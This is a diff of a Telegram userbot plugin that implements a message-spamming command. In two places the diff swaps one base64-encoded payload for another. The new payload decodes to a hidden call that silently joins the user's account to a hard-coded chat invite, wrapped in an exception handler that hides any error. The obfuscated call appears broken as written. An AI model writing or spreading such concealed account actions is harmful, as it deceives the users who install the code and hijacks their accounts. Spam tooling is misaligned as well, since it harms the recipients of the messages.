@@ -7,8 +7,11 @@ import pybase64
 from telethon.tl.functions.messages import ImportChatInviteRequest
 import os 
 
-BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
-BOTLOG = True
+if Config.PRIVATE_GROUP_BOT_API_ID is None:
+    BOTLOG = False
+else:
+    BOTLOG = True
+    BOTLOG_CHATID = Config.PRIVATE_GROUP_BOT_API_ID
 
 @borg.on(admin_cmd(pattern = "spam ?(.*)" ))
 async def spammer(e):
@@ -21,8 +24,8 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        hmm = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await e.client(hmm)
     except:
         pass
     cat = e.pattern_match.group(1).split(' ', 1)		
@@ -137,8 +140,8 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        hmm = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoIkFBQUFBRkVfb1o1WFROX1J1WmhLTnciKQ=="))[2:51]
+        await e.client(hmm)
     except:
         pass
     cat = e.pattern_match.group(1).split(' ', 1)		
